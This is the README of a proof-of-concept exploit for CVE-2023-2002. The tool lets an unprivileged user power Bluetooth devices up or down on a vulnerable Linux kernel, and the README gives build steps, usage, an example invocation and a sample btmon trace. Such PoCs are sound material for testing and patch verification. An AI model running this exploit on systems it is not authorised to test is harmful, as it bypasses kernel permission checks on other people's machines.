# bt_power

Set the power status of Bluetooth devices as an unprivileged user. This is a
PoC exploit of CVE-2023-2002.

## Build

Simply run `make` in the same directory as `bt_power.c`.

## Usage

If no arguments are passed, the usage message will be displayed:
```
$ ./bt_power
Usage: ./bt_power POWER_STATUS DEVICE_INDEX
	POWER_STATUS := { up | down }
	DEVICE_INDEX := { 0 | 1 | ... }
```

## Examples

```
./bt_power up 0
```
This attempts to power up the 0th Bluetooth device. If the kernel is
vulnerable to CVE-2023-2002, `bt_power` can be executed by an unprivileged
user and it will succeed with a `Success!` message. Otherwise, if the kernel
is not vulnerable and `bt_power` is executed by an unprivileged user, it
should fail with a `Failed. Reason: MGMT_STATUS_PERMISSION_DENIED` message.

It is helpful to run `btmon` in another terminal, which monitors the
management commands sent and the events received, so that one can clearly see
what is happening:
```
$ sudo btmon
Bluetooth monitor ver 5.66
= Note: Linux version 6.2.10-arch1-1 (x86_64)
= Note: Bluetooth subsystem version 2.22
= New Index: XX:XX:XX:XX:XX:XX (Primary,USB,hci0)
@ RAW Open: sudo (privileged) version 2.22
@ RAW Close: sudo
@ MGMT Open: sudo (privileged) version 1.22
@ MGMT Command: Set Powered (0x0005) plen 1
        Powered: Enabled (0x01)
= Open Index: XX:XX:XX:XX:XX:XX
...
... omitted HCI commands and events
...
@ MGMT Event: Command Complete (0x0001) plen 7
      Set Powered (0x0005) plen 4
        Status: Success (0x00)
        Current settings: 0x00000081
          Powered
          BR/EDR
@ MGMT Close: sudo
```
